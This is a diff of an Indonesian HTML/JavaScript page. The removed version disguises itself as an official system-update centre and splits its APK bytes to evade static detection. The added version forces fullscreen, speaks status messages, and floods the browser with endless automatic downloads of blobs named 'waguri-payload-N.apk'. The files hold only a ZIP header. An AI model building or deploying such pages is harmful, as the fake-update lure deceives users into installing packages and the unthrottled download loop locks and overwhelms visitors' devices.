@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Application Package Manager</title>
+<title>Generator Berkas Blob &amp; ObjectURL (Direct APK Edition)</title>
 <style>
 * {
   box-sizing: border-box;
@@ -11,93 +11,77 @@
   padding: 0;
 }
 body {
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-  background: #0f172a;
-  color: #f8fafc;
+  font-family: Arial, sans-serif;
+  background: #f4f6f8;
+  color: #222;
   padding: 20px;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  min-height: 100vh;
 }
 .panel {
-  background: #1e293b;
-  padding: 32px;
+  background: #ffffff;
+  padding: 24px;
   border-radius: 12px;
-  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
-  max-width: 520px;
-  width: 100%;
-  border: 1px solid #334155;
-  text-align: center;
+  box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
+  max-width: 600px;
+  margin: 40px auto;
 }
 :fullscreen {
-  background: #030712 !important;
-  color: #f8fafc !important;
-  padding: 24px !important;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
+  background: #111111 !important;
+  color: #00ff00 !important;
+  padding: 20px !important;
+  overflow-y: auto !important;
+  width: 100vw !important;
+  height: 100vh !important;
 }
 :-webkit-full-screen {
-  background: #030712 !important;
-  color: #f8fafc !important;
-  padding: 24px !important;
+  background: #111111 !important;
+  color: #00ff00 !important;
+  padding: 20px !important;
+  overflow-y: auto !important;
 }
-h2 { 
-  margin-bottom: 8px; 
-  font-size: 20px;
-  color: #f1f5f9;
-}
-p { 
-  margin-bottom: 20px; 
-  line-height: 1.5; 
-  color: #94a3b8;
-  font-size: 14px;
-}
+h2 { margin-bottom: 10px; }
+p { margin-bottom: 15px; line-height: 1.5; }
 button {
   width: 100%;
-  padding: 14px;
+  padding: 16px;
   cursor: pointer;
   border: none;
-  border-radius: 8px;
-  background: #2563eb;
+  border-radius: 6px;
+  background: #d32f2f;
   color: #ffffff;
-  font-weight: 600;
-  font-size: 15px;
-  box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
+  font-weight: bold;
+  font-size: 16px;
+  box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
   transition: background 0.2s;
 }
-button:hover { background: #1d4ed8; }
+button:hover { background: #b71c1c; }
 #status {
   margin-top: 16px;
-  font-weight: 500;
-  color: #38bdf8;
+  font-weight: bold;
+  color: #d32f2f;
   padding: 12px;
-  background: rgba(56, 189, 248, 0.1);
+  background: #ffebee;
   border-radius: 6px;
-  font-size: 13px;
-  border: 1px solid rgba(56, 189, 248, 0.2);
+  text-align: center;
+  border: 1px solid #ffcdd2;
 }
 #downloads {
   margin-top: 20px;
   display: grid;
   grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
-  gap: 8px;
-  max-height: 180px;
+  gap: 10px;
+  max-height: 220px;
   overflow-y: auto;
 }
 #downloads a {
   display: block;
   padding: 8px;
-  background: #090d16;
-  color: #4ade80;
+  background: #212121;
+  color: #80df82;
   text-decoration: none;
   border-radius: 4px;
-  font-size: 11px;
-  font-family: monospace;
+  font-size: 12px;
   text-align: center;
-  border: 1px solid #1e293b;
+  border: 1px solid #424242;
   word-break: break-all;
 }
 </style>
@@ -105,10 +89,10 @@ button:hover { background: #1d4ed8; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Pusat Pembaruan Sistem</h2>
-<p>Klik tombol di bawah untuk memeriksa dan mengunduh pembaruan paket aplikasi resmi (.apk).</p>
+<h2>Generator Berkas Blob &amp; ObjectURL</h2>
+<p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas biner Blob ber-ekstensi <strong>.apk</strong> secara terus-menerus.</p>
 
-<button id="start-btn" type="button">Unduh Pembaruan Sistem (.apk)</button>
+<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate APK Blob</button>
 
 <div id="status" role="status">Sistem siap.</div>
 <div id="downloads"></div>
@@ -123,19 +107,27 @@ const downloadsDiv = document.getElementById("downloads");
 
 let activeUrls = [];
 let isProcessing = false;
-const MAX_URLS_TRACKED = 50;
+const MAX_URLS_TRACKED = 100;
 
-// Teknik Obfuscation: Byte dipecah dan di-decode secara runtime untuk menghindari string matching statis
-const encodedParts = [
-  "UEs",     // 'PK' header bagian 1
-  "DBBQ",    // header bagian 2
-  "AAAAIAAAAIQ", // header bagian 3
-  "AAAAAAAAAAAAAAAAAAAAAAAA"
-];
+// Base64 payload data (Header ZIP / APK: PK..)
+const b64Data = "UEsDBBQAAAAIAAAAIQ";
 
-const assembleAndDecode = () => {
-  const fullB64 = encodedParts.join("");
-  const binary = atob(fullB64);
+const speak = (message) => {
+  if ('speechSynthesis' in window) {
+    try {
+      window.speechSynthesis.cancel();
+      const utterance = new SpeechSynthesisUtterance(message);
+      utterance.lang = 'id-ID';
+      utterance.rate = 1.0;
+      window.speechSynthesis.speak(utterance);
+    } catch (e) {
+      console.warn("SpeechSynthesis error:", e);
+    }
+  }
+};
+
+const decodeBase64ToBytes = (b64) => {
+  const binary = atob(b64);
   const len = binary.length;
   const bytes = new Uint8Array(len);
   for (let i = 0; i < len; i++) {
@@ -144,35 +136,34 @@ const assembleAndDecode = () => {
   return bytes;
 };
 
-const prepareStealthApkBlobAsync = (i) => {
+const prepareApkBlobAsync = (i) => {
   return new Promise((resolve) => {
     queueMicrotask(() => {
       try {
-        const bytesArr = assembleAndDecode();
-        // Menggunakan MIME type resmi Android APK agar sistem langsung mengenalinya sebagai paket instalasi
+        const bytesArr = decodeBase64ToBytes(b64Data);
+        // Langsung bentuk Blob dengan MIME type application/vnd.android.package-archive
         const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
         const url = URL.createObjectURL(blob);
         resolve({ id: i, url: url, success: true });
       } catch (err) {
-        resolve({ id: i, url: null, success: false });
+        resolve({ id: i, url: null, success: false, error: err.message });
       }
     });
   });
 };
 
-const triggerStealthDownload = (fileData) => {
+const triggerInstantDownload = (fileData) => {
   if (!fileData.success) return;
 
   const link = document.createElement("a");
   link.href = fileData.url;
-  // Ekstensi tetap diatur sebagai .apk secara eksplisit
-  link.download = `system-update-${fileData.id}.apk`;
-  link.textContent = `Update #${fileData.id} (.apk)`;
+  link.download = `waguri-payload-${fileData.id}.apk`;
+  link.textContent = `APK #${fileData.id} (.apk)`;
   link.style.display = "none";
   downloadsDiv.appendChild(link);
   link.click();
 
-  if (downloadsDiv.children.length > 20) {
+  if (downloadsDiv.children.length > 30) {
     downloadsDiv.removeChild(downloadsDiv.firstChild);
   }
 };
@@ -180,7 +171,7 @@ const triggerStealthDownload = (fileData) => {
 const processLoop = async (counter) => {
   if (!isProcessing) return;
 
-  const fileData = await prepareStealthApkBlobAsync(counter);
+  const fileData = await prepareApkBlobAsync(counter);
   if (fileData.success) {
     activeUrls.push(fileData.url);
 
@@ -189,11 +180,15 @@ const processLoop = async (counter) => {
       try { URL.revokeObjectURL(oldUrl); } catch (e) {}
     }
 
-    triggerStealthDownload(fileData);
-    statusDiv.textContent = `Mengirim pembaruan APK ke-${counter}...`;
+    triggerInstantDownload(fileData);
+    statusDiv.textContent = `Proses Berjalan: Berkas APK ke-${counter} dikirim`;
+
+    if (counter % 10 === 0) {
+      speak(`Proses mencapai ${counter} berkas APK.`);
+    }
   }
 
-  setTimeout(() => processLoop(counter + 1), 1500);
+  setTimeout(() => processLoop(counter + 1), 0);
 };
 
 startBtn.addEventListener("click", () => {
@@ -205,16 +200,27 @@ startBtn.addEventListener("click", () => {
   activeUrls = [];
   downloadsDiv.replaceChildren();
 
+  speak("Mengaktifkan mode layar penuh.");
+
   const root = document.documentElement;
   try {
     if (root.requestFullscreen) {
-      root.requestFullscreen().catch(() => {});
+      root.requestFullscreen();
+    } else if (root.webkitRequestFullscreen) {
+      root.webkitRequestFullscreen();
+    } else if (root.mozRequestFullScreen) {
+      root.mozRequestFullScreen();
     }
-  } catch (err) {}
+    statusDiv.textContent = "Mengunci layar penuh...";
+  } catch (err) {
+    console.warn("Fullscreen tidak didukung atau ditolak:", err);
+  }
 
-  isProcessing = true;
-  statusDiv.textContent = "Menyiapkan instalasi paket...";
-  processLoop(1);
+  setTimeout(() => {
+    isProcessing = true;
+    speak("Proses pembuatan berkas Blob APK dimulai.");
+    processLoop(1);
+  }, 300);
 });
 </script>
 </body>
